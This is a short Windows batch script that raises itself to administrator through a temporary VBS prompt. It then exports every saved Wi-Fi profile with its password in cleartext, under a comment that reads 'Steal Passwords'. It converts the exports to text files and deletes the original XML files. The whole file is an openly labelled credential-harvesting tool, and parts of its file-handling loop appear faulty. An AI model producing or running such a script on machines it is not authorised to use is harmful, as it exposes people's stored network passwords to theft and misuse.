@echo off
setlocal enabledelayedexpansion

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

:: Steal Passwords
netsh wlan export profile key=clear

:: Find and delete the XML files
for /f "delims=" %%a in ('dir /b *.xml') do (
    set "file=%%a"
    set "file=%file:~,-4%"
    set "file=%file%.txt"
    netsh wlan show profile "%%a" key=clear > "%%a.txt"
    del "%%a"
)

:: Done
echo Passwords have been saved to text files and XML files have been deleted.
pause